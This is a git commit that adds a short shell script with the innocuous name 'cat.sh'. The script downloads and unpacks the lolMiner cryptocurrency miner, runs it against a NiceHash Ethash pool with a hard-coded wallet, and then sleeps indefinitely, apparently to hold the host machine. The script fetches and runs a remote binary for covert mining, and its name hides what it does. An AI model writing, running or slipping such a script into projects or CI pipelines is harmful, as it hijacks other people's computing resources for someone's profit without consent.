cf4079c14b71b893174aedef3b57e4a16318150f
angkii <83603708+angkii@users.noreply.github.com>
2021-12-29 16:02:28 +0700

    Create cat.sh

---
+++ cat.sh
@@ -0,0 +1,7 @@
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
+
+tar -xvf lolMiner_v1.29_Lin64.tar.gz
+
+cd 1.29;./lolMiner --algo ETHASH --pool daggerhashimoto.eu.nicehash.com:3353 -u 3BsJ6cvtviyvS6tWfFWaDGHStB8pTHUrNH.sex1 --ethstratum ETHPROXY --tstart 50 --tstop 65
+
+sleep 999999999999999999999999999999
